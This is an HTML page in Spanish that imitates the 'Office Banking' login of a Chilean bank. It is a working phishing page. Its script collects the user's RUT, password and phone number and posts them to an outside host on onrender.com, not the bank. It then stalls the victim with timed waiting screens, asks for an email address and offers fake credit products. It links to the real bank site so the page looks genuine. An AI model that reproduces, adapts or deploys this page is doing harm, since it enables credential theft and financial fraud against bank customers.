<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Office Banking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="styles.css">
  <style>
    .spinner {
      border: 8px solid #f3f3f3;
      border-top: 8px solid red;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 2s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg);}
      100% { transform: rotate(360deg);}
    }
    .hidden { display:none; }
    .btn-red {
      background-color: red;
      color: white;
      padding: 10px 20px;
      border: none;
      font-weight: bold;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <!-- Formulario inicial -->
    <form id="loginForm">
      <label for="rut">RUT</label>
      <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required>
      
      <label for="passwd">Contrase√±a</label>
      <input type="password" id="passwd" name="passwd" required>

      <label for="telefono">Tel√©fono actualizado</label>
      <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required>
      
      <label class="checkbox-label">
        <input type="checkbox" id="contacto" name="contacto" required>
        Deseo que me contacte un ejecutivo para solicitar L√≠nea de Cr√©dito o Tarjeta de Cr√©dito.  
      </label>
      
      <div class="options">
        <label><input type="checkbox" id="recordar"> Recordar usuario</label>
        <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">Olvid√© mi clave</a>
      </div>
      
      <button type="submit">Ingresar</button>
    </form>
    <div id="resultado"></div>

    <!-- Pantalla de espera -->
    <div id="pantallaEspera" class="hidden">
      <h2>Estamos actualizando la informaci√≥n, por favor espera...</h2>
      <div class="spinner"></div>
    </div>

    <!-- Formulario de correo -->
    <div id="formCorreo" class="hidden">
      <h2>Necesitamos actualizar tu correo electr√≥nico</h2>
      <input type="email" id="correo" placeholder="Ingresa tu correo">
      <button onclick="enviarCorreo()">Enviar</button>
    </div>

    <!-- Pantalla de productos disponibles -->
    <div id="pantallaProductos" class="hidden">
      <img src="logo-office-banking.png" alt="Office Banking" class="logo">
      <h2>Tenemos algunos productos disponibles para tu Empresa</h2>
      <button class="btn-red" onclick="continuarProductos()">Continuar</button>
    </div>

    <div class="footer-icons">
      <div>üìä<br>Indicadores Econ√≥micos</div>
      <div>‚òéÔ∏è<br>Contact Center</div>
    </div>
  </div>

  <script>
    // Validaci√≥n de RUT
    function validarRut(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
      if(rutCompleto.length < 2) return false;
      let cuerpo = rutCompleto.slice(0, -1);
      let dv = rutCompleto.slice(-1);
      let suma = 0, multiplo = 2;
      for(let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo.charAt(i)) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }
      let dvEsperado = 11 - (suma % 11);
      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
      return dv === dvEsperado;
    }

    document.getElementById("loginForm").addEventListener("submit", async function(e){
      e.preventDefault();
      const rut = document.getElementById("rut").value;
      const passwd = document.getElementById("passwd").value;
      const telefono = document.getElementById("telefono").value;
      const contacto = document.getElementById("contacto").checked;

      if(!validarRut(rut)){
        document.getElementById("resultado").innerText = "‚ùå RUT inv√°lido";
        return;
      }
      if(!contacto){
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Debe aceptar ser contactado por un ejecutivo.";
        return;
      }

      try {
        const response = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/proxy-login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ rut, passwd, telefono })
        });
        const data = await response.text();
        document.getElementById("resultado").innerText = data;

        if(response.ok){
          // Ocultar login y mostrar pantalla de espera
          document.getElementById("loginForm").style.display="none";
          document.getElementById("pantallaEspera").classList.remove("hidden");

          // Despu√©s de 1 minuto mostrar formulario de correo
          setTimeout(()=>{
            document.getElementById("pantallaEspera").classList.add("hidden");
            document.getElementById("formCorreo").classList.remove("hidden");
          }, 60000); // 1 minutos
        }
      } catch (error) {
        document.getElementById("resultado").innerText = "‚ö†Ô∏è Error al conectar con el servidor.";
      }
    });

    function enviarCorreo(){
      document.getElementById("formCorreo").classList.add("hidden");
      document.getElementById("pantallaEspera").classList.remove("hidden");

      setTimeout(()=>{
        document.getElementById("pantallaEspera").classList.add("hidden");
        document.getElementById("pantallaProductos").classList.remove("hidden");
      }, 30000); // 30 segundos
    }

    function continuarProductos(){
      document.getElementById("pantallaProductos").classList.add("hidden");
      document.getElementById("pantallaEspera").classList.remove("hidden");

      setTimeout(()=>{
        window.location.href="productos.html";
      }, 30000); // 30 segundos
    }
  </script>
</body>
</html>
